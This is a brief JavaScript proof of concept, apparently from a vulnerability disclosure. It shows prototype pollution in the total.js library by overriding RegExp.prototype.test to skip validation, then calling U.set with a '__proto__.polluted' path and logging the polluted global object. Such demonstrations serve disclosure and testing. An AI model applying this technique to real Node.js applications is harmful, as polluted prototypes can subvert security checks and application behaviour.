RegExp.prototype.test = () => true;
const total = require('total.js');
obj = {};
console.log({}.polluted);
U.set({}, '__proto__.polluted', 'yes');
console.log({}.polluted);